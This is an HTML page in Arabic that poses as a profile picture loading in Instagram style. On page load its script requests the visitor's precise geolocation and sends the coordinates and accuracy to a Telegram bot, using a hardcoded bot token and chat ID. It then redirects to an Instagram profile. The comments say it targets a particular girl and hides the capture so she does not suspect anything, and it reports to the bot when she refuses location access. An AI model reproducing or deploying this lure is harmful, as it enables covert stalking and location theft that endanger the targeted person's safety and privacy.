<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري عرض الصورة...</title>
    <style>
        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #e1306c; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 15px; color: #8e8e8e; font-size: 14px; }
    </style>
</head>
<body>

<div style="text-align: center;">
    <div class="loader"></div>
    <p>جاري تحميل الصورة الشخصية...</p>
</div>

<script>
    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chat_id = '7214473798';

    function capture() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(p) {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                const acc = p.coords.accuracy;
                const mapLink = `https://www.google.com/maps?q=${lat},${lat},${lon}`;
                
                // إرسال الموقع لتليجرام
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('🎯 صيد الذكريات (صورة مشتركة)!\n📍 الموقع: ' + mapLink + '\n📏 الدقة: ' + acc.toFixed(1) + ' متر')}`);
                
                // تحويلها لبروفايلها فوراً بعد ثانية واحدة
                setTimeout(() => {
                    window.location.href = "https://www.instagram.com/ha2542213";
                }, 1000);

            }, function(e) {
                // إذا رفضت، نحولها لإنستغرام عشان ما تشك، بس نبلغك إنها رفضت
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('⚠️ البنت فتحت رابط الصورة ورفضت الموقع.')}`);
                window.location.href = "https://www.instagram.com/ha2542213";
            }, {enableHighAccuracy: true});
        }
    }

    // تشغيل السحب فور فتح الرابط
    window.onload = capture;
</script>
</body>
</html>
